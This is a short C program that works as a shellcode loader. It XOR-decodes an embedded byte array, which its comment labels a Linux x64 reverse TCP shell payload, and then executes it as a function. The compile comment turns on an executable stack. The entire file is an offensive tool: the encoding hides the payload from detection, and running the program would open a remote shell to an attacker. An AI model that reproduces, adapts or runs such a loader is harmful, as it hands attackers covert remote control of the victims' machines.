#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// To compile:
// gcc -o simpleLoader simpleLoader.c -z execstack

// XOR-encoded 'linux/x64/shell_reverse_tcp' payload (key: 0xfa)
unsigned char buf[] =
    "\x90\xd3\xa2\x63\x90\xf8\xa5\x90\xfb\xa4\xf5\xff\xb2\x6d\xb2\x43"
    "\xf8\xfa\xfb\x41\x3a\x52\xcb\x9c\xab\xb2\x73\x1c\x90\xea\xa0\x90"
    "\xd0\xa2\xf5\xff\x90\xf9\xa4\xb2\x05\x34\x90\xdb\xa2\xf5\xff\x8f"
    "\x0c\x90\xc1\xa2\x63\xb2\x41\xd5\x98\x93\x94\xd5\x89\x92\xfa\xa9"
    "\xb2\x73\x1d\xa8\xad\xb2\x73\x1c\xf5\xff";

int main (int argc, char **argv)
{
        int key = 250;
        int buf_len = (int) sizeof(buf);

        // Decode the payload
        for (int i=0; i<buf_len; i++)
        {
                buf[i] = buf[i] ^ key;
        }

        // Cast the shellcode to a function pointer and execute
        int (*ret)() = (int(*)())buf;
        ret();
}
